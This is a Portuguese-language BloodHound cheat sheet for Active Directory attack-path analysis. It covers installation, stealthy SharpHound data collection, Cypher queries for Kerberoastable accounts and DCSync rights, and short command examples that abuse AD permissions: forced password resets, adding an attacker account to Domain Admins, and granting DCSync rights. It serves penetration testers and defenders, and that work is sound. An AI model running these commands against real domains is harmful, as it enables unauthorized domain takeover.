# 🩸 BloodHound — visualização de caminhos de ataque em Active Directory

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de versão:** o original mistura BloodHound Legacy e Community Edition (CE). CE significa edição comunitária, não edição empresarial ou alojada na nuvem. A afirmação «PostgreSQL em vez de Neo4j» é demasiado absoluta: a composição oficial inclui armazenamento de aplicação PostgreSQL e armazenamento de grafos Neo4j. [Composição oficial](https://github.com/SpecterOps/BloodHound/blob/main/examples/docker-compose/docker-compose.yml). Interfaces, propriedades, consultas e coletores devem corresponder à geração instalada; métodos predefinidos não equivalem necessariamente a All. [Guia CE](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) e [compatibilidade de BloodHound.py](https://github.com/dirkjanm/BloodHound.py). Um nó representa uma entidade; uma relação liga entidades e pode descrever uma oportunidade de ataque. Os nomes ingleses das consultas da interface foram conservados, acompanhados de explicações portuguesas.

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        Visualização de caminhos de ataque em AD
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Attack Paths">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Graph">
</p>

---

## 📋 Índice

- [O que é o BloodHound](#-what-is-bloodhound)
- [Instalação](#-installation)
- [Recolha com SharpHound](#-sharphound-collection)
- [Utilizar a interface gráfica do BloodHound](#-using-bloodhound-gui)
- [Consultas integradas](#-built-in-queries)
- [Consultas Cypher personalizadas](#-custom-cypher-queries)
- [Análise de caminhos de ataque](#-attack-path-analysis)
- [BloodHound CE](#-bloodhound-ce)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-bloodhound"></a>
## 🎯 O que é o BloodHound

O **BloodHound** utiliza a teoria dos grafos para revelar caminhos de ataque pouco visíveis em Active Directory. Permite visualizar:

- 🔗 **Caminhos de ataque** — Percursos até administrador do domínio
- 👤 **Relações dos utilizadores** — Associações a grupos e sessões
- 💻 **Relações de confiança dos computadores** — Privilégios de administrador e sessões
- 🔓 **Configurações incorretas** — Permissões suscetíveis de exploração
- 🎯 **Alvos de elevado valor** — Contas críticas

### Componentes

| Componente | Descrição |
|-----------|-------------|
| **BloodHound** | Interface gráfica de visualização (baseada em Neo4j) |
| **SharpHound** | Recolha de dados (.exe ou .ps1) |
| **Neo4j** | Base de dados de grafos de suporte |
| **BloodHound CE** | Nova edição para a nuvem ou empresas |

---

<a id="-installation"></a>
## 🚀 Instalação

### Kali Linux

```bash
# Instalar BloodHound
sudo apt update
sudo apt install bloodhound

# Instalar Neo4j
sudo apt install neo4j

# Iniciar Neo4j
sudo neo4j start

# Aceder à interface Web do Neo4j: http://localhost:7474
# Credenciais predefinidas: neo4j / neo4j (alterar no primeiro início de sessão)

# Iniciar BloodHound
bloodhound
```

### Windows

```powershell
# Descarregar a partir das versões publicadas no GitHub
https://github.com/BloodHoundAD/BloodHound/releases

# Instalar Neo4j Community Edition
https://neo4j.com/download/

# Iniciar Neo4j
# Executar como administrador e iniciar o serviço

# Executar BloodHound.exe
```

### Docker (recomendado)

```bash
# Neo4j com configuração adequada ao BloodHound
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# Aguardar pelo arranque e executar BloodHound
bloodhound
```

---

<a id="-sharphound-collection"></a>
## 📡 Recolha com SharpHound

### Descarregar SharpHound

```bash
# A partir das versões publicadas do BloodHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# Ficheiros:
# - SharpHound.exe (executável autónomo)
# - SharpHound.ps1 (PowerShell)
```

### Recolha básica

```powershell
# Executar SharpHound (predefinição: todos os métodos de recolha)
.\SharpHound.exe

# Indicar o domínio
.\SharpHound.exe -d domain.local

# Indicar o destino da saída
.\SharpHound.exe -o C:\Temp\

# Versão PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

### Métodos de recolha

```powershell
# Todos os métodos de recolha
.\SharpHound.exe -c All

# Métodos específicos
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

### Detalhes dos métodos de recolha

| Método | Descrição | Atividade gerada |
|--------|-------------|-------|
| Default | Group, LocalAdmin, Session, Trusts | Baixa |
| All | Tudo | Elevada |
| Session | Utilizadores com sessão iniciada | Média |
| LocalGroup | Membros de grupos locais | Média |
| ACL | Permissões ACL | Baixa |
| DCOnly | Recolha apenas nos controladores de domínio | Muito baixa |
| Group | Associações a grupos | Baixa |
| Trusts | Relações de confiança entre domínios | Baixa |

### Recolha com menor visibilidade

```powershell
# Modo de menor visibilidade (mais lento, com menos atividade)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# Sem resolução DNS
.\SharpHound.exe --skipdns

# Intervalo entre pedidos
.\SharpHound.exe --throttle 1000
```

### Recolha repetida (sessões)

```powershell
# Recolher sessões ao longo do tempo
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Repetir a recolha com um intervalo
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

### A partir de Linux (bloodhound.py)

```bash
# Instalar
pip install bloodhound

# Executar a recolha
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# Com hash
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

<a id="-using-bloodhound-gui"></a>
## 🖥️ Utilizar a interface gráfica do BloodHound

### Iniciar BloodHound

```bash
# 1. Iniciar Neo4j
sudo neo4j start

# 2. Aguardar pelo Neo4j (verificar http://localhost:7474)

# 3. Iniciar BloodHound
bloodhound

# 4. Iniciar sessão
# URL: bolt://localhost:7687
# Nome de utilizador: neo4j
# Palavra-passe: (a sua palavra-passe)
```

### Importar dados

```
1. Clicar em "Upload Data" (carregar dados), no ícone de pasta
2. Selecionar o ficheiro .zip produzido pelo SharpHound
3. Aguardar pela conclusão da importação
4. Os dados surgem no grafo
```

### Visão geral da interface

| Secção | Descrição |
|---------|-------------|
| **Pesquisa** | Encontrar utilizadores, computadores e grupos |
| **Análise** | Consultas predefinidas |
| **Filtros** | Visibilidade de relações e nós |
| **Grafo** | Representação visual |
| **Informação do nó** | Detalhes do item selecionado |

### Navegação

```
- Clique esquerdo: selecionar um nó
- Clique direito: abrir o menu de contexto
- Roda do rato: ampliar ou reduzir
- Arrastar: deslocar a vista
- Ctrl+Click: adicionar à seleção
```

---

<a id="-built-in-queries"></a>
## 🔍 Consultas integradas

### Informações do domínio

```
- Find all Domain Admins — Encontrar todos os administradores do domínio
- Find all Domain Controllers — Encontrar todos os controladores de domínio
- Find high value targets — Encontrar alvos de elevado valor
- Map Domain Trusts — Mapear relações de confiança entre domínios
```

### Caminhos mais curtos

```
- Shortest Paths to Domain Admins — Caminhos mais curtos até administradores do domínio
- Shortest Path from Owned Principals — Caminho mais curto a partir de entidades comprometidas
- Shortest Path to High Value Targets — Caminho mais curto até alvos de elevado valor
- Shortest Path to Unconstrained Delegation — Caminho mais curto até delegação sem restrições
```

### Kerberos

```
- Find Kerberoastable Accounts — Encontrar contas suscetíveis a Kerberoasting
- Find AS-REP Roastable Users — Encontrar utilizadores suscetíveis a AS-REP roasting
- Shortest Path from Kerberoastable Users — Caminho mais curto a partir de utilizadores suscetíveis a Kerberoasting
- Find Principals with Unconstrained Delegation — Encontrar entidades com delegação sem restrições
```

### Análise de ACL

```
- Find Principals with DCSync Rights — Encontrar entidades com permissões DCSync
- Find Dangerous Rights for Domain Users — Encontrar permissões perigosas para utilizadores do domínio
- Find Users with Foreign Domain Group Membership — Encontrar utilizadores pertencentes a grupos de outro domínio
```

### Computadores

```
- Find Computers with Unsupported OS — Encontrar computadores com sistemas operativos sem suporte
- Find Computers where Domain Users are Local Admin — Encontrar computadores onde os utilizadores do domínio são administradores locais
- Find Computers with Sessions of High Value Users — Encontrar computadores com sessões de utilizadores de elevado valor
```

### GPO

```
- Find all GPO Owned by Owned Principals — Encontrar todas as GPO controladas por entidades comprometidas
- Find GPO Affecting High Value Targets — Encontrar GPO que afetam alvos de elevado valor
```

---

<a id="-custom-cypher-queries"></a>
## 📝 Consultas Cypher personalizadas

### Consultas básicas

```cypher
// Encontrar todos os utilizadores
MATCH (u:User) RETURN u

// Encontrar todos os computadores
MATCH (c:Computer) RETURN c

// Encontrar todos os administradores do domínio
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Encontrar todos os controladores de domínio
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Consultas sobre sessões

```cypher
// Encontrar os sistemas com sessões de administradores do domínio
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// Encontrar utilizadores com sessões em vários computadores
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

### Consultas sobre caminhos

```cypher
// Caminho mais curto até administrador do domínio
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// Todos os caminhos até administrador do domínio (limite de 10)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// Caminhos a partir de entidades comprometidas
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### Consultas sobre ACL

```cypher
// Utilizadores com permissões DCSync
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// Utilizadores que podem repor palavras-passe
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// Utilizadores com GenericAll em computadores
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

### Consultas sobre Kerberos

```cypher
// Utilizadores suscetíveis a Kerberoasting com caminho até administrador do domínio
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// Utilizadores suscetíveis a AS-REP roasting
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Computadores com delegação sem restrições
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### Alvos de elevado valor

```cypher
// Marcar alvos de elevado valor
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// Encontrar caminhos até alvos de elevado valor
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

<a id="-attack-path-analysis"></a>
## 🎯 Análise de caminhos de ataque

### Encontrar caminhos de ataque

```
1. Procurar o nó de partida (utilizador comprometido)
2. Clicar com o botão direito → "Mark as Owned" (marcar como comprometido)
3. Executar a consulta "Shortest Path from Owned Principals" (caminho mais curto a partir de entidades comprometidas)
4. Analisar as relações do caminho
```

### Relações de ataque comuns

| Relação | Método de ataque |
|------|---------------|
| **MemberOf** | Associação a grupos |
| **AdminTo** | Privilégios de administrador local |
| **HasSession** | Recolha de credenciais |
| **CanRDP** | Acesso RDP |
| **CanPSRemote** | Comunicação remota com PowerShell |
| **ExecuteDCOM** | Execução através de DCOM |
| **GenericAll** | Controlo total |
| **GenericWrite** | Alterar o objeto |
| **WriteOwner** | Alterar o proprietário |
| **WriteDacl** | Alterar a ACL |
| **ForceChangePassword** | Repor a palavra-passe |
| **AddMember** | Adicionar ao grupo |
| **AllExtendedRights** | DCSync, etc. |
| **GetChanges** | DCSync (parte 1) |
| **GetChangesAll** | DCSync (parte 2) |

### Explorar relações de ataque

#### GenericAll num utilizador

```powershell
# Repor a palavra-passe
net user targetuser NewP@ssw0rd /domain

# Ou com PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

#### GenericAll num computador

```powershell
# Ataque à delegação restrita baseada em recursos
# Utilizar Rubeus e PowerMad
```

#### ForceChangePassword

```powershell
# Repor a palavra-passe
net user targetuser NewP@ssw0rd /domain
```

#### AddMember

```powershell
# Adicionar um utilizador ao grupo
net group "Domain Admins" attackeruser /add /domain

# Ou com PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

#### WriteDacl

```powershell
# Adicionar permissões DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

<a id="-bloodhound-ce"></a>
## 🆕 BloodHound CE

### Acerca do BloodHound CE

O **BloodHound Community Edition** é a nova versão:
- Interface Web moderna
- Base de dados de suporte PostgreSQL (em vez de Neo4j)
- API REST
- Desempenho melhorado

### Instalação

```bash
# Docker Compose (recomendado)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Acesso: http://localhost:8080
# Predefinição: admin / (consultar os registos do Docker)
```

### SharpHound para CE

```powershell
# Descarregar um coletor compatível com CE
# A partir das versões publicadas de BloodHound CE

# Executar a recolha (mesma sintaxe)
.\SharpHound.exe -c All
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos de SharpHound

| Comando | Descrição |
|---------|-------------|
| `.\SharpHound.exe` | Recolha predefinida |
| `.\SharpHound.exe -c All` | Todos os métodos |
| `.\SharpHound.exe -c DCOnly` | Apenas DC (menor visibilidade) |
| `.\SharpHound.exe -c Session --loop` | Recolha repetida de sessões |
| `.\SharpHound.exe -d domain.local` | Indicar o domínio |
| `.\SharpHound.exe --stealth` | Modo de menor visibilidade |

### Consultas comuns

| Consulta | Finalidade |
|-------|---------|
| Find all Domain Admins (Encontrar todos os administradores do domínio) | Identificar membros de Domain Admins |
| Shortest Path to DA (Caminho mais curto até Domain Admins) | Encontrar um caminho de ataque |
| Kerberoastable Users (Utilizadores suscetíveis a Kerberoasting) | Encontrar SPNs para Kerberoasting |
| AS-REP Roastable (Suscetíveis a AS-REP roasting) | Utilizadores sem pré-autenticação |
| Unconstrained Delegation (Delegação sem restrições) | Exploração da delegação |
| DCSync Rights (Permissões DCSync) | Encontrar entidades com permissões DCSync |

### Fluxo de análise

```
1. Recolher dados com SharpHound
2. Importar para BloodHound
3. Marcar as entidades comprometidas
4. Executar "Shortest Path from Owned" (caminho mais curto a partir de entidades comprometidas)
5. Analisar as relações de ataque
6. Executar os ataques
7. Marcar as novas entidades comprometidas
8. Repetir
```

### Ficheiros principais

```
Saída de SharpHound:
- *_BloodHound.zip (dados JSON)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

## 📚 Recursos

- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [BloodHound Docs](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

### Guias de referência relacionados
- [Mimikatz](../../Mimikatz/translations/README.pt.md)
- [PowerShell](../../PowerShell/translations/README.pt.md)
- [Escalada de privilégios em Windows](../../Windows-PrivEsc/translations/README.pt.md)

---

<p align="center">
  <b>🩸 Encontre o seu caminho até administrador do domínio!</b><br>
  <i>BloodHound — um aliado de quem testa a segurança de AD</i>
</p>
